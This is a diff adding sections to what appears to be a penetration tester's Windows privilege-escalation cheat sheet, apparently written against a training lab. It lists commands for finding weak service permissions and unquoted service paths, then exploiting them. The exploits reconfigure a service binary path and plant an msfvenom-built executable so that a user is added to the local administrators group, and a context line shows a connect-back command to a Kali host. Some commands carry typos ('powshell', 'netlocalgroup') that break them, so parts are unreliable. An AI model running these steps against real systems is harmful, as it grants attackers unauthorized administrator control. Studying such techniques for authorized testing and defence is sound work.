@@ -103,7 +103,44 @@ ms.exe <Kali-IP> 5555  # From target
 
 ### Service Exploits
 
+#### Binary Paths
+
 ```powershell
+# Detection
+powshell -ep bypass
+. .\PowerUp.ps1
+Invoke-AllChecks
+# Another way
+accesschk64.exe -uwcv Everyone *
+# In either case, look for 'CanRestart True' as the service will need to be restarted
+accesschk64.exe -wuvc daclsvc  # Running against a found service
+# Look for SERVICE_CHANGE_CONFIG
+
+# Exploitation
+sc qc daclsvc  # Identify binary path
+sc config daclsvc binpath="net localgroup administrators user /add"
+sc qc daclsvc
+netlocalgroup administrators
+sc start daclsvc 
+netlocalgroup administrators
+```
+
+#### Unquoted Service Paths
+
+```powershell
+# Detection
+powshell -ep bypass
+. .\PowerUp.ps1
+Invoke-AllChecks
+# Look for ServiceName where Path does not contain any quotes (and can restart)
+sc qc unquotedsvc
+
+# Exploitation
+msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
+# Copy the generated file, common.exe, to the Windows VM.
+# Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
+# Open command prompt and type:
+sc start unquotedsvc
 ```
 
 ### Registry Exploits
